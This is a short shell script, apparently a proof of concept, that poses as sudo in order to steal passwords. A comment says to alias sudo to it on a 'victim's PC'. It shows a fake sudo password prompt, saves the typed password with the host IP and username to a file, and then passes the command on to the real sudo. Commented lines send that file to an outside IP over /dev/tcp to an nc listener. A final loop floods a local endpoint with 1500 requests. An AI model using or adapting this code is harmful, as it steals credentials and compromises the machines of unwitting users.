#!/bin/sh

currentDir=$(pwd)

## run this first to "install" the script on victims PC
# alias sudo="bash $currentDir/sudo.sh"

read -sp "[sudo] password for $USER: " password

address=$(hostname --ip-address)

echo "$address :: $USER :: $password" > ${USER}_sudo_pass.txt

echo ""

params=""
for a in "$@"
do
    if [[ "$params" != "" ]]
    then
        params+=" "
    fi
    params+="$a"
done

echo $password | sudo -S echo >/dev/null 2>&1
sudo -S $params

## this even work?
# exec 5<>/dev/tcp/111.2.333.44/22
# echo -e "echo $password > ${USER}_sudo_pass.txt" >&5
# cat <&5

## or

## on your machine do
# nc -l -p 8081
# cat "$currentDir/${USER}_sudo_pass.txt" > /dev/tcp/111.2.333.44/8081

## mitigation https://superuser.com/questions/793240/preventing-malware-from-sniffing-the-sudo-password

for i in `seq 1 1500`; do curl http://localhost:8079/ddos/someservice/verylazy; done
